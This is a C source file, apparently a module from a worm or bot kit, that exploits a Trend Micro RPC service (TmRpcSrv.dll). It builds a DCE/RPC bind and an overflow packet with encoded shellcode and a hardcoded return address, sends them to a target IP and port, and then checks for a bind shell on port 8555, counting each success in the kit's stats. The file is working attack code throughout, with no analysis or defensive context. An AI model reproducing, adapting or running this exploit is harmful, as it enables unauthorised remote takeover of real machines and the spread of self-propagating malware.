#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#pragma comment( lib, "ws2_32.lib" )

/* 25288888-bd5b-11d1-9d53-0080c83a5c2c v1.0 */
unsigned char uszDceBind[] =
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00" 
	"\x88\x88\x28\x25\x5B\xBD\xD1\x11\x9D\x53\x00\x80\xC8\x3A\x5C\x2C" 
	"\x01\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00";

/* rpc_opnum_0 */
unsigned char uszDceCall[] =
	"\x05\x00\x00\x83\x10\x00\x00\x00\x08\x08\x00\x00\x01\x00\x00\x00"
	"\xE0\x07\x00\x00\x00\x00\x00\x00\x88\x88\x28\x25\x5B\xBD\xD1\x11"
	"\x9D\x53\x00\x80\xC8\x3A\x5C\x2C\x04\x00\x03\x00\xD0\x07\x00\x00";

unsigned char uszShellcode[] =
"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xde\x74\x95"
"\x1c\x83\xeb\xfc\xe2\xf4\x22\x1e\x7e\x51\x36\x8d\x6a\xe3\x21\x14"
"\x1e\x70\xfa\x50\x1e\x59\xe2\xff\xe9\x19\xa6\x75\x7a\x97\x91\x6c"
"\x1e\x43\xfe\x75\x7e\x55\x55\x40\x1e\x1d\x30\x45\x55\x85\x72\xf0"
"\x55\x68\xd9\xb5\x5f\x11\xdf\xb6\x7e\xe8\xe5\x20\xb1\x34\xab\x91"
"\x1e\x43\xfa\x75\x7e\x7a\x55\x78\xde\x97\x81\x68\x94\xf7\xdd\x58"
"\x1e\x95\xb2\x50\x89\x7d\x1d\x45\x4e\x78\x55\x37\xa5\x97\x9e\x78"
"\x1e\x6c\xc2\xd9\x1e\x5c\xd6\x2a\xfd\x92\x90\x7a\x79\x4c\x21\xa2"
"\xf3\x4f\xb8\x1c\xa6\x2e\xb6\x03\xe6\x2e\x81\x20\x6a\xcc\xb6\xbf"
"\x78\xe0\xe5\x24\x6a\xca\x81\xfd\x70\x7a\x5f\x99\x9d\x1e\x8b\x1e"
"\x97\xe3\x0e\x1c\x4c\x15\x2b\xd9\xc2\xe3\x08\x27\xc6\x4f\x8d\x27"
"\xd6\x4f\x9d\x27\x6a\xcc\xb8\x1c\xb4\x77\xb8\x27\x1c\xfd\x4b\x1c"
"\x31\x06\xae\xb3\xc2\xe3\x08\x1e\x85\x4d\x8b\x8b\x45\x74\x7a\xd9"
"\xbb\xf5\x89\x8b\x43\x4f\x8b\x8b\x45\x74\x3b\x3d\x13\x55\x89\x8b"
"\x43\x4c\x8a\x20\xc0\xe3\x0e\xe7\xfd\xfb\xa7\xb2\xec\x4b\x21\xa2"
"\xc0\xe3\x0e\x12\xff\x78\xb8\x1c\xf6\x71\x57\x91\xff\x4c\x87\x5d"
"\x59\x95\x39\x1e\xd1\x95\x3c\x45\x55\xef\x74\x8a\xd7\x31\x20\x36"
"\xb9\x8f\x53\x0e\xad\xb7\x75\xdf\xfd\x6e\x20\xc7\x83\xe3\xab\x30"
"\x6a\xca\x85\x23\xc7\x4d\x8f\x25\xff\x1d\x8f\x25\xc0\x4d\x21\xa4"
"\xfd\xb1\x07\x71\x5b\x4f\x21\xa2\xff\xe3\x21\x43\x6a\xcc\x55\x23"
"\x69\x9f\x1a\x10\x6a\xca\x8c\x8b\x45\x74\x31\xba\x75\x7c\x8d\x8b"
"\x43\xe3\x0e\x74\x95\x1c";

BOOL tmicro(EXINFO exinfo) 
{
	SOCKET sConnect;
	SOCKADDR_IN sockAddr;
	char szRecvBuf[512];
	unsigned char uszPacket[2056];
	int nRet;

	sConnect = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( sConnect == INVALID_SOCKET ) {
		return -1;
	}

	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = inet_addr( exinfo.ip );	
	//sockAddr.sin_port = htons( atoi( argv[2] ) );
	sockAddr.sin_port = htons((unsigned short)exinfo.port);


	nRet = connect( sConnect, (SOCKADDR *)&sockAddr, sizeof( sockAddr ) );
	if ( nRet == SOCKET_ERROR ) {
		closesocket( sConnect );
		return -1;
	}


	nRet = send( sConnect, (const char *)uszDceBind, sizeof( uszDceBind ) - 1, 0 );
	if ( nRet  == SOCKET_ERROR ) {
		closesocket( sConnect );
		return -1;
	}

	nRet = recv( sConnect, szRecvBuf, sizeof( szRecvBuf ), 0 );
	if ( nRet <= 0 ) {
		closesocket( sConnect );
		return -1;
	}

	memset( uszPacket, 0x41, sizeof( uszPacket ) );
	memcpy( uszPacket, (const char *)uszDceCall, sizeof( uszDceCall ) );
	memcpy( uszPacket+48, uszShellcode, sizeof( uszShellcode ) - 1 );
	/* call ebx, 0x6574131C, TmRpcSrv.dll */
	/* jmp ebx, 0x7C4E4A66, kernel32.dll */
	memcpy( uszPacket + 1198, "\x1C\x13\x74\x65", 4 );
	memcpy( uszPacket + 2048, "\xD0\x07\x00\x00\xD0\x07\x00\x00", 8 );


	nRet = send( sConnect, (const char *)uszPacket, sizeof( uszPacket ), 0 );
	if ( nRet == SOCKET_ERROR ) {
		closesocket( sConnect );
		return -1;
	}
	
	Sleep(5000);
	if (BuZShell(exinfo,8555)) { 
		exploit[exinfo.exploit].stats++; 
		return true; 
	}  

	closesocket( sConnect );
	return 0;
}